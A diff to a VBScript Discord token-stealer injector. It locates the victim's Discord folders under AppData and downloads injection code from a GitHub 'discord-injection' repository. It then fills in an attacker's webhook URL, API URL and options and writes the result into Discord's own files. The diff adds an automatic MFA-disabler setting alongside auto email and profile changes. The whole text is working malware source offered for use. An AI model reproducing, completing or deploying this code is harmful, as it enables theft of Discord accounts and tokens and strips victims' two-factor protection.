@@ -1,6 +1,6 @@
 Dim fileSystem, mainFolder, subFolder, appFolder, moduleFolder, desktopFolder, file
 Dim moviePath, appPattern, modulePattern, desktopPattern, indexPattern
-Dim discordDirectories, injection_url, webhook_url, api_url, gofile_download_link, auto_user_profile_edit, auto_email_update
+Dim discordDirectories, injection_url, webhook_url, api_url, auto_mfa_disabler, auto_email_update, auto_user_profile_edit, gofile_download_link
 Dim userName, localAppDataPath
 
 userName = CreateObject("WScript.Network").UserName
@@ -9,9 +9,10 @@ injection_url = "https://raw.githubusercontent.com/k4itrun/discord-injection/mai
 
 webhook_url = "replace_webhook_url"
 api_url = "replace_api_url"
-gofile_download_link = "replace_gofile_download_link"
-auto_user_profile_edit = "replace_auto_user_profile_edit"
+auto_mfa_disabler = "replace_auto_mfa_disabler"
 auto_email_update = "replace_auto_email_update"
+auto_user_profile_edit = "replace_auto_user_profile_edit"
+gofile_download_link = "replace_gofile_download_link"
 
 localAppDataPath = "C:\Users\" & userName & "\AppData\Local\"
 discordDirectories = Array( _
@@ -74,9 +75,10 @@ For Each folder In discordDirectories
 
                                                     fileContent = Replace(fileContent, "%WEBHOOK_URL%", webhook_url)
                                                     fileContent = Replace(fileContent, "%API_URL%", api_url)
-                                                    fileContent = Replace(fileContent, "%GOFILE_DOWNLOAD_LINK%", gofile_download_link)
-                                                    fileContent = Replace(fileContent, "%AUTO_USER_PROFILE_EDIT%", auto_user_profile_edit)
+                                                    fileContent = Replace(fileContent, "%AUTO_MFA_DISABLER%", auto_mfa_disabler)
                                                     fileContent = Replace(fileContent, "%AUTO_EMAIL_UPDATE%", auto_email_update)
+                                                    fileContent = Replace(fileContent, "%AUTO_USER_PROFILE_EDIT%", auto_user_profile_edit)
+                                                    fileContent = Replace(fileContent, "%GOFILE_DOWNLOAD_LINK%", gofile_download_link)
                                                     
                                                     Set textFile = fileSystem.OpenTextFile(filePath, 2)
                                                     textFile.Write fileContent
